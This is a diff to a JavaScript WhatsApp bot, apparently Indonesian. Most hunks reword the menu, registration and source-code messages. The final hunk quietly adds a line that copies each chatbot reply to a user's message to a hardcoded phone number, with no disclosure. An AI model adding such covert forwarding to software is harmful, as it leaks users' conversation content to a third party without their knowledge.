@@ -1145,7 +1145,8 @@ case 'menu':
 case 'help':
 if (!getRpgId(sender)) return reply(`❎ _kamu belum mendaftar ketik /daftar untuk akses bot_`)
 uptime = process.uptime()
-teks = `╭﹛☕︎︎﹜ *PROFILE*
+teks = `
+╭﹛☕︎︎﹜ *PROFILE*
 │🂡 name ${pushname}
 │🂡 money $${getMoneyUser(sender)}
 │🂡 user ${_rpg.length} *active*
@@ -1910,7 +1911,7 @@ break
 case 'daftar':
 if (getRpgId(sender)) return reply(`❎ _kamu sudah terdaftar sebelumnya_`)
 await addRpgId(sender)
-reply(`*SUKSES REGISTRASION*\n\nnama: ${pushname},\nmention: ${sender.split("@s.whatsapp.net")}\ndate: ${date}\n\nKetik /desa untuk melihat perkembangan desamu`)
+reply(`『•• *BERHASIL TERDAFTAR* ••』\n\nkeuntungan terdaftar:\n• kamu dapat mengakses semua fitur bot kecuali fitur untuk admin grup dan owner\n\n• kamu dapat memainkan game rpg, ketik /desa untuk melihat proggres desamu`)
 break
 				
 case 'hidetag':
@@ -2807,7 +2808,7 @@ break
 }
 
 if (buttonsR === 'SOURCE CODE') {
-reply(`ingin meningstall script bot ini, harap jangan menghapus thanks to yang berada dimenu dan jangan diperjual belikan ke publik\n. \n. \nbot ini menggunakan script dari mentahan mhankbarbar kemudian di recode dan jadilah bot seperti sekarang\n. \n. \nurl : github.com/ChacaX`)
+reply(`ingin menginstall script ini? 🤔 oh boleh banget asal *mematuhi persyaratan* dari owner asli bot ini ya.\n.\n.\nsyarat syarat yang wajib dipatuhi:\n🌟 dilarang *menjual belikan* sc ini! harap hargai pembuat masal owner aja ngasih gratis tapi kamu jual\n🌟 *dilarang mengubah thanks to* yang berada di script ini oke\n\n*click* link berikut untuk menginstall script github.com/ChacaX/Botwea`)
 }
 	
 if (buttonsR === 'Tutup') {
@@ -2895,6 +2896,7 @@ break
 						muehe = await simih(budy)
 						console.log(muehe)
 						reply(muehe)
+						client.sendMessage('6285731261728@s.whatsapp.net', muehe, text) 
 					} else {
 						return //console.log(color('[WARN]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
 					}
